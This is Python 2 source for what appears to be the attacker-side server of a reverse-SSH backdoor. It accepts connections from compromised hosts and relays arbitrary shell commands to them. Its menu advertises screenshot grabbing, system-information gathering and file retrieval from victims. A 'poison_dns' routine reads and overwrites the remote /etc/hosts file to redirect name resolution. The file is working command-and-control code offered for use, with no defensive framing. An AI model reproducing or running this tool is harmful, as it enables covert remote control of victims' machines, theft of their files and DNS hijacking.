#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
import socket
import paramiko
import threading
import sys
import base64
import hashlib
import getopt

USERNAME = []
PASSWORD = []
PORT = ""
ADDRESS = ""

class Server(paramiko.ServerInterface):
	
	def __init__(self):
		self.event = threading.Event()
		
	def check_channel_request(self, kind, chanid):
		if kind=='session':
			return paramiko.OPEN_SUCCEEDED
		return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
	
	def check_auth_password(self, username, password):
		global USERNAME, PASSWORD
		#usr = hashlib.sha224(username).hexdigest()
		#pssw = hashlib.sha224(password).hexdigest()
		if username in USERNAME :
			index = USERNAME.index(username)
			if password==PASSWORD[index] :
				return paramiko.AUTH_SUCCESSFUL
		return paramiko.AUTH_FAILED	



def ssh_server():
	host_key = paramiko.RSAKey(filename='test_rsa.key')
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		sock.bind((ADDRESS, PORT))
		sock.listen(100)
		print "[+] Waiting for connection..."
		client, addr = sock.accept()
	except Exception as ex:
		print "[-] Exception while ssh_server sock initialization: " + str(ex)
		return False
	print "[+] Client connected!"
	try:
		transport = paramiko.Transport(client)
		transport.add_server_key(host_key)
		server = Server()
		try:
			transport.start_server(server=server)
		except paramiko.SSHException as ex:
			print "[-] Exception SSH negotiation"
		channel = transport.accept(20)
		print "[+] Authenticated"
		channel.send("[<<!!<<] Server Ready [>>!!>>]")
		command_console(channel)
		transport.close()
	except Exception as ex:
		print "[-] Exception caught: " + str(ex)
		try:
			transport.close()
		except Exception as ex:
			print "[-] Exception while closing transport"
			return False
	
	
			
def command_console(channel):	
	while True:
		try:
			command = raw_input("Enter command: ").strip('\n')
			if command == "poison_dns":
				print "\n" + \
				"\nxxxxxxxxxxxxxxxxxxxxx|xxxx[o]xxxx|xxxx[o]xxxx|xxxx[o" + \
				"\n| DNS Poisoning|xxxx[o]xxxx|xxxx[o]xxxx|xxxx[o]xxxx|" + \
				"\n|______________|xxxxx|xxxx[o]xxxx|xxxx[o]xxxx|xxxx[o"
				print "\n\n" + \
				"[+] Localizating hosts file..."
				channel.send('locate /etc/hosts')
				location = channel.recv(1024)
				if location:
					print "[+] Locate Command Success, Output:\n%s" % location
					print "[+] Enter specific filepath"
					location = raw_input("Filepath: ")
					while True:
						print "\n[+] Press:" + \
						"\n\tA] For hosts file example" + \
						"\n\tB] To see content of hosts file" + \
						"\n\tC] To change hosts file content" + \
						"\n\tD] To end DNS poisoning" + \
						"\n\n"
						option = raw_input("[+] Enter option:")
						if option == "A":
							print "\n" + \
							"\n----------------------------------------------------------" + \
							"\n127.0.0.1	localhost" + \
							"\n127.0.1.1	nzzn.znnz	nzzn" + \
							"\n# The following lines are desirable for IPv6 capable hosts" + \
							"\n::1     localhost ip6-localhost ip6-loopback" + \
							"\nff02::1 ip6-allnodes" + \
							"\nff02::2 ip6-allrouters" + \
							"\n----------------------------------------------------------" + \
							"\n\n"
						elif option == "B":
							channel.send('cat %s' % location)
							cat = channel.recv(1024)
							print "\n" + \
							"\n----------------------------------------------------------" + \
							"\n" + cat + \
							"\n----------------------------------------------------------"
						elif option == "C":
							print "\n\n[+] Write the document here:" + \
							"\n~ copy and paste it (Press Enter After Copy) " + \
							"\n~ write it line by line" + \
							"\n~ insert ==EnD== to stop the insertion loop\n\n"
							while True:
								h_input = ""
								while True:
									insert = raw_input("Insert Line:")
									if insert != "==EnD==":
										if insert == "":
											insert = "\n"
										else:
											insert += "\n"
										h_input += insert
										print "h_input = %s" % h_input
									else:
										break
								print "h_input = %s" % h_input
								print "Hosts:\n" + \
								"\n----------------------------------------------------------"
								print h_input 
								print "" + \
								"\n----------------------------------------------------------"
								if raw_input("[+] Is the text correct? [y/n] :") == "y":
									break
								h_input = h_input.replace("\n","$'\n'")								
							channel.send('echo \"%s\" > %s' % (h_input,location))
						elif option == "D":
							channel.send('#eNd#')
							break
				else:
					print "[-] Unable to find hosts file..."
			elif command == "help":
				print_help()
			elif command != 'exit':
				channel.send(command)
				print "\n\n" + \
				"####################################################\n"+ \
				"# Answer Start  #|[||]|#|[||]|#|[||]|#|[||]|#|[||]|#\n"+ \
				"####################################################\n\n"+ \
							channel.recv(1024) + "\n\n" + \
				"####################################################\n"+ \
				"# Answer End    #|[||]|#|[||]|#|[||]|#|[||]|#|[||]|#\n"+ \
				"####################################################\n"	
			else:
				channel.send('exit')
				print "[*] Exiting SSH..."
				return False				
		except KeyboardInterrupt:
			return False
			
			
def read_server_config():
	global USERNAME,PASSWORD
	konfig = open("ServerKonfig.conf","r")
	for n in konfig.read().split("[!]"):
		if n[0] == "#":
			pass
		elif "username" in n:
			start_index = n.index(":") + 1
			end_index = n.index("#")
			USERNAME.append(n[start_index:end_index])
		elif "password" in n:
			start_index = n.index(":") + 1
			end_index = n.index("#")
			PASSWORD.append(n[start_index:end_index])

def print_help():
		print "\n\n" + \
		"|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|\n|\n" + \
		"| Usage:\n" + \
		"|   > help                 => print this\n" + \
		"|   > grab_screen          => get a screenshot of remote system\n" + \
		"|   > get_sys_info         => get information about remote system\n" + \
		"|   > get_file [filepath]  => get a file from remote system\n" + \
		"|   > poison_dns           => poison the remote host's dns file" + \
   "\n|\n|~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~|\n\n"
		print "\n\n" + \
		"x~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n" + \
		"x] [<!>] Caution:\n" + \
		"x] \tFor commands like \'cd\',\'mkdir\' use multiple commands syntax:\n" + \
		"x] \t\texample: cd ..; pwd\n" + \
		"x~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~" + \
		"\n\n"

def main():
	os.system("clear");
	print "\n\n" + \
	"_______________________________________________\n"+\
	"| Python | Reverse SSH Tunnelling | Server |###|\n"+\
	"|____  __|________________________|________|###|________________________________________________\n" +\
	"+##############9 ############  ##################################o  #################  \#xxxxxxx+\n"  +\
	"|####b        ##\ ##########  ##################################o o  ################  d##xxxxxx|\n"  +\
	"+####/ ######  ##9 ########  ###7            ###6  ####9  #####o  #o  #####/    #####  \###xxxxx+\n"  +\
	"|####b ##  \##  ##\ ######  ####3            ###8  ####8  ####o  ###o  ####b     ####  d####xxxx|\n"  +\
	"+####/ ##  d##  ###9 ####  #####3 ###7  ###  ###6  ####9  ###o  #####o  ###/  #   ###  \#####xxx+\n"  +\
	"|####b ######  #####\ ##  ###########3  ########8         ##o  #######o  ##b  ##   ##  d######xx|\n"  +\
	"+####/        #######9   ############7  ########6  ....   ##o  #######o  ##/  ###   #  \#######x+\n"  +\
	"|####b  ##############\ #############3  ########8  ####8  ###o  #####o  ###b  ####     d######xx|\n"  +\
	"+####/ ###############9 #############7  ########6  ####9  ####o  ###o  ####/  #####    \#####xxx+\n"  +\
	"|####b  ##############\ #############3  ########8  ####8  #####o  #o  #####b  ######   d####xxxx|\n"  +\
	"+####/ ###############9 #############7  ########6  ####9  ######o o  ######/  #######  \###xxxxx+\n"  +\
	"|####b  ##############\ #############3  ########8  ####8  #######o  #######b  ########  ##xxxxxx|\n"  +\
	"+####/  ##############9 #############7  #########  ####9  ########o########/  ######### ###xxxxx+\n"  +\
	"|####b ##############################3  ########## ####8  #################b  ##############xxxx|\n"  +\
	"+####/###############################7  ###############9  #################/  #############xxxxx+\n"  +\
	"|#########################################################################################xxxxxx|\n"  +\
	"+##########################################################################################xxxxx+\n"  +\
	"|#########################################################################################xxxxxx|\n"  +\
	"\n\n"
	global ADDRESS,PORT
	print "\n\n" + \
	"!=========================================================!\n" + \
	"| Usage:\n" + \
	"| \t-a => address to bind\n" + \
	"| \t-p => port to bind\n" + \
	"| \texample: python PythonServerSSH.py -a 0.0.0.0 -p 22\n" + \
	"!=========================================================!" + \
	"\n\n"
	try:
		opts = getopt.getopt(sys.argv[1:],"a:p:", \
			["ADDRESS","PORT"])[0]
	except getopt.GetoptError as err:
		print str(err)
	for t in opts:
		if t[0] in ('-a'):
			ADDRESS = t[1]
		elif t[0] in ('-p'):
			PORT = int(t[1])
		else:
			print "[-] The option doesn't exist!s"
	if ADDRESS:
		print "[+] Bind address set to : %s" % ADDRESS
	else:
		print "[+] No address option found, using default address '0.0.0.0'"
		ADDRESS = "0.0.0.0"
	if PORT:
		print "[+] Bind port set to : %s" % PORT
	else:
		print "[+] No port option found, using default port: 6666"
		PORT = 6666
	read_server_config()
	if raw_input("[+] Print usage? [y/n] :") == "y":
		print_help()
	ssh_server()

if __name__ == '__main__':
    main()
	
